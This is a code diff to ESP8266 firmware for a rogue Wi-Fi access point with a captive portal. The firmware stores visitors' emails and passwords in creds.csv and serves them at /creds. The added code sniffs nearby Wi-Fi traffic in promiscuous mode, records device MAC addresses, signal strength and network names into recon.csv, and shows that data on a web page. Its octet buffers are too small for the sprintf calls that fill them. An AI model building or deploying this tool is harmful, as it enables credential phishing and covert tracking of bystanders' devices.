@@ -15,6 +15,12 @@
 #define PASS_TITLE "Credentials"
 #define CLEAR_TITLE "Cleared"
 
+// maximum devices in list
+#define maxDevices 100
+
+// recon scan in seconds
+#define scanDurationSec 5
+
 // Init System Settings
 const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
@@ -24,17 +30,33 @@ IPAddress APIP(172, 0, 0, 1); // Gateway
 unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
 DNSServer dnsServer; ESP8266WebServer webServer(80);
 
+
+// frame data variables
+String ssid; String srcMAC; String dstMAC; // Source + Dest MAC address
+char srcOctBuffer[2]; char dstOctBuffer[2];
+uint8_t ft; uint8_t fst; // frame & subframe type
+
+
+// store up to 100 devices
+// MAC, Type, Channel, RSSI, SSID, Encryption
+String devices[maxDevices][6]; int devCount = 0;
+
+// MAC address list of known WiFi networks
+String knownNetworks;
+
 void setup() {
     delay(500);
     Serial.begin(115200);
 
-    // init, scan for 30 sec, run rogue AP
+    // initialize promiscuous WiFi scanning
     esppl_init(cb);
-
     WiFi.mode(WIFI_OFF); wifi_promiscuous_enable(true);
+
+    // gather recon for 30 seconds and generate CSV
+    SPIFFS.begin();
     wifiRecon();
     
-    SPIFFS.begin(); 
+     
     bootTime = lastActivity = millis();
 
     Serial.println(); Serial.println("Starting Rogue WiFi AP \""+(String) SSID_NAME+"\"");
@@ -66,26 +88,85 @@ void loop() {
 
 void cb(esppl_frame_info *info) {
 
-  Serial.print("\n");
-  Serial.print("FT: ");  
-  Serial.print((int) info->frametype);
-  Serial.print(" FST: ");  
-  Serial.print((int) info->framesubtype);
-  Serial.print(" SRC: ");
-  for (int i = 0; i < 6; i++) Serial.printf("%02x", info->sourceaddr[i]);
-  Serial.print(" DEST: ");
-  for (int i = 0; i < 6; i++) Serial.printf("%02x", info->receiveraddr[i]);
-  Serial.print(" RSSI: ");
-  Serial.print(info->rssi);
-  Serial.print(" SEQ: ");
-  Serial.print(info->seq_num);
-  Serial.print(" CHNL: ");
-  Serial.print(info->channel);
-  if (info->ssid_length > 0) {
-    Serial.print(" SSID: ");
-    for (int i = 0; i < info->ssid_length; i++) Serial.print((char) info->ssid[i]);    
-  }
+    // gather list of MAC addresses
+    // if MAC is already spotted, change status or ignore
 
+    // create network SSID and MAC strings
+    ssid = "";
+    if (info->ssid_length > 0) { for (int i= 0; i< info->ssid_length; i++) { ssid+= (char) info->ssid[i]; } }
+
+    srcMAC = ""; srcOctBuffer[2];
+    for (int i= 0; i< 6; i++) { sprintf(srcOctBuffer, "%02x", info->sourceaddr[i]); srcMAC+=srcOctBuffer; }
+
+    dstMAC = ""; dstOctBuffer[2];
+    for (int i= 0; i< 6; i++) { sprintf(dstOctBuffer, "%02x", info->receiveraddr[i]); dstMAC+=dstOctBuffer; }
+
+    ft  = (int) info->frametype; fst = (int) info->framesubtype;
+
+    /* check if src device is known, first pass-over */
+
+    bool srcIsKnown =  deviceKnown(srcMAC);
+    
+    if (!srcIsKnown && devCount<maxDevices-2) { 
+        
+        bool deviceLogged = false; // device log status for defaults
+
+        /** MARK AS ACCESS POINT **/
+        // if BEACON FRAME, ASSOC RESPONSE, PROBE RESPONSE, REASSOC RESPONSE detected
+        
+        if((ft==0) and (fst==1 or fst==3 or fst==5 or fst==8 or fst==12)) {
+            devices[devCount][1] = "AP";      // Type
+            devices[devCount][5] = "unknown"; // Encryption
+
+            if (ssid.equals("")) { devices[devCount][4] = "*hidden network*"; }      // ESSID / Network Name
+            else                 { devices[devCount][4] = ssid; }
+            deviceLogged = true;
+        }
+
+        /** MARK AS STATION DEVICE **/
+        // if PROBE REQ, ASSOC REQ, REASSOC REQ detected
+        
+        else if((ft==0) and (fst==0 or fst==2 or fst==4)) {
+            devices[devCount][1] = "Station"; // Type
+            devices[devCount][4] = "N/A";      // ESSID
+            devices[devCount][5] = "N/A";      // Encryption
+            deviceLogged = true;
+        }
+
+        // if DATA PACKET and destination MAC is AP
+        else if ((ft==1 && fst==0) and isAP(dstMAC)) {
+            devices[devCount][1] = "Station"; // Type
+            devices[devCount][4] = "N/A";      // ESSID
+            devices[devCount][5] = "N/A";      // Encryption
+            deviceLogged = true;
+        }
+
+        /** ADD DEFAULTS **/
+        
+        if (deviceLogged) {
+            devices[devCount][0] = srcMAC;                 // MAC Address
+            devices[devCount][2] = (String) info->channel; // Channel
+            devices[devCount][3] = (String) info->rssi;    // RSSI
+            devCount++;
+        }        
+    }
+
+    // second pass-over, sort out stray client devices
+    bool dstIsKnown =  deviceKnown(dstMAC);
+
+    if(!dstIsKnown && devCount<maxDevices-2) {
+
+        // if DATA PACKET and source MAC is an AP
+        if((ft==1 && fst==0) and isAP(srcMAC)) {
+            devices[devCount][0] = dstMAC;
+            devices[devCount][1] = "Station";
+            devices[devCount][2] = (String) info->channel;
+            devices[devCount][3] = (String) info->rssi;
+            devices[devCount][4] = "N/A";      // ESSID
+            devices[devCount][5] = "N/A";      // Encryption
+            devCount++;
+        }
+    }
 }
 
 /***** DEFAULT FILE SETUP *****/
@@ -95,38 +176,92 @@ void fileSetup() {
     // check if creds.csv & recon.csv exists
     // if not, create the files and append csv headers
     Serial.println("\nSetting up default files...");
+
     if (!SPIFFS.exists("/creds.csv")) {
         Serial.println("Database creds.csv not found, creating new file.");
         File tmpCreds = SPIFFS.open("/creds.csv", "w");
-        tmpCreds.println("EMAIL,PASSWORD");
+        tmpCreds.println("<b>EMAIL</b>,<b>PASSWORD</b>");
         tmpCreds.close();
     }
-    else { Serial.println("Database creds.csv found!"); Serial.println("Access credentials at 172.0.0.1/creds");}    
-
+    else { Serial.println("Database creds.csv found!"); Serial.println("Access credentials at 172.0.0.1/creds"); }    
 }
 
 /***** GATHER WIFI RECON *****/
 
 void wifiRecon() {
-
-    unsigned long interval = 5000; // 30 seconds
+    unsigned long interval = scanDurationSec*1000; // 30 seconds
     unsigned long currTime = millis();
     unsigned long prevTime = millis();
 
-    Serial.println("Starting recon for 30 seconds:");
-            esppl_sniffing_start();
+    Serial.println(); Serial.println();
+    Serial.print("Starting recon for "+String (interval/1000)+" seconds...");
+    esppl_sniffing_start();
 
-            while (currTime - prevTime < interval) { // gather recon for 30 seconds, save to recon.csv
-                currTime = millis();
-                for (int i = 1; i < 15; i++ ) {
-                    esppl_set_channel(i);
-                    while (esppl_process_frames()) {
-                        //
-                    }
-                }
-            }  
-    Serial.println("Exiting recon");
+    while (currTime - prevTime < interval) { // gather recon for 30 seconds, save to recon.csv
+        currTime = millis();
+        for (int i = 1; i < 15; i++ ) {
+            esppl_set_channel(i);
+            while (esppl_process_frames()) {
+                //
+            }
+        }
+    }    
     
+    Serial.println("done!");
+    Serial.println("Saving to CSV database \"recon.csv\"");
+    Serial.println();
+    generateReconDB();
+
+    esppl_sniffing_stop();
+    wifi_promiscuous_enable(false);
+    WiFi.mode(WIFI_OFF);
+}
+
+
+// generate recon CSV database from devices Array
+
+void generateReconDB() {
+
+    if (!SPIFFS.exists("/recon.csv")) {
+        Serial.println("Database recon.csv not found, creating new file.");
+        File tmpRecon = SPIFFS.open("/recon.csv", "w");
+        tmpRecon.println("<b>MAC Address</b>,<b>Type</b>,<b>Channel</b>,<b>RSSI</b>,<b>Network Name</b>");
+        tmpRecon.close();
+    }
+    else { Serial.println("Database recon.csv found!"); Serial.println("Access recon data at 172.0.0.1/recon"); }
+
+    File recon = SPIFFS.open("/recon.csv", "a");
+
+    Serial.println("Writing "+ (String) devCount +"devices to database.");
+    for(uint8_t i=0; i<devCount; i++){
+        for (uint8_t j=0; j<4; j++){
+            recon.print(devices[i][j]);
+            recon.print(",");
+        }
+        recon.println(devices[i][4]);
+    }
+
+    recon.close();
+    Serial.println("Successfully generated recon.csv!");
+}
+
+// check if device is known
+
+bool deviceKnown(String bssid) {
+    // look through devices Array for known BSSID
+    for (uint8_t i=0; i<devCount; i++) {
+        if(devices[i][0].equals(bssid)) {
+            return true;
+        }
+    }
+    return false;
+}
+
+bool isAP(String bssid) {
+    for (uint8_t i=0; i<devCount; i++) {
+        if (devices[i][0].equals(bssid) && devices[i][1].equals("AP")) { return true; }
+    }
+    return false;
 }
 
 /***** WEB SERVER *****/
@@ -192,7 +327,31 @@ String index() {
 }
 
 String recon() {
-    String reconHTML;
+    Serial.println();
+    Serial.print("Serving recon.html ... ");
+    String reconHTML = header(PASS_TITLE) + "<html><body> <style>td {border: 1px solid #dddddd; text-align: left; padding: 8px 20px;} table {border-collapse: collapse; width:100%;}</style><table>";
+    
+    // read csv file and construct html string 
+    Serial.println("Reading recon.csv database");
+    File reconDB = SPIFFS.open("/recon.csv", "r");
+    char buffer[256];
+    while (reconDB.available()) {
+        int l = reconDB.readBytesUntil('\n', buffer, sizeof(buffer));
+        buffer[l] = 0;
+        
+        // split username and password
+        String tmpHTML = buffer;
+        reconHTML+="<tr>";
+        for (uint8_t i=0; i<5; i++) {
+            reconHTML+="<td>"+tmpHTML.substring(0,tmpHTML.indexOf(","))+"</td>";
+            tmpHTML = tmpHTML.substring(tmpHTML.indexOf(",")+1,tmpHTML.length());
+        }    
+        reconHTML+="</tr>";        
+    }
+    reconHTML+="</table></body></html><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
+    reconDB.close();
+
+    Serial.println("finished!");
 
     return reconHTML;
 }
@@ -224,8 +383,13 @@ String posted() {
 // clear csv database
 String clear() {
     File credDB = SPIFFS.open("/creds.csv", "w");
-    credDB.println("EMAIL,PASSWORD");
+    credDB.println("<b>EMAIL</b>,<b>PASSWORD</b>");
     credDB.close();
 
-    return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
+    File reconDB = SPIFFS.open("/recon.csv", "w");
+    reconDB.println("<b>MAC Address</b>,<b>Type</b>,<b>Channel</b>,<b>RSSI</b>,<b>Network Name</b>");
+    reconDB.close();
+    devCount = 0;
+
+    return header(CLEAR_TITLE) + "<div><p>The credentials & recon list have been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
